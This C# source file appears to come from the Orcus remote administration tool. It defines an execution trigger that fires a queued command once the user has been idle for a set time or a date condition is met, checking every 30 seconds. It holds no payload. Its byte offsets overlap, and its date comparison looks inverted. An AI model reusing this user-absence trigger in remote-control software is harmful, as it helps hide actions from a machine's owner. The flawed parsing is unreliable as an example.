using System;
using System.Runtime.InteropServices;
using System.Timers;
using Orcus.Native;
using Orcus.Shared.DynamicCommands.ExecutionEvents;

namespace Orcus.StaticCommandManagement.ExecutionEvents
{
    public class IdleExecutionEvent : IExecutionEvent
    {
        private int _requiredIdleTime;
        private bool _executeAtDateTime;
        private DateTime _dateTime;
        private Timer _waiter;

        public bool CanExecute
        {
            get
            {
                var lastInPut = new LASTINPUTINFO();
                lastInPut.cbSize = (uint) Marshal.SizeOf(lastInPut);

                if (NativeMethods.GetLastInputInfo(ref lastInPut) &&
                    (uint) Environment.TickCount - lastInPut.dwTime > _requiredIdleTime*1000)
                {
                    return true;
                }

                return _executeAtDateTime && _dateTime >= DateTime.UtcNow;
            }
        }

        public uint Id { get; } = 2;
        public event EventHandler TheTimeHasCome;

        public void Initialize(byte[] parameter)
        {
            _requiredIdleTime = BitConverter.ToInt32(parameter, 0);
            _executeAtDateTime = parameter[5] == 1;
            _dateTime = DateTime.FromBinary(BitConverter.ToInt64(parameter, 5));

            if (!CanExecute)
            {
                _waiter = new Timer();
                _waiter.Elapsed += WaiterOnElapsed;
                _waiter.Interval = 30000; //30 seconds
                _waiter.Start();
            }
        }

        private void WaiterOnElapsed(object sender, ElapsedEventArgs elapsedEventArgs)
        {
            if (CanExecute)
            {
                TheTimeHasCome?.Invoke(this, EventArgs.Empty);
                _waiter.Dispose();
            }
        }
    }
}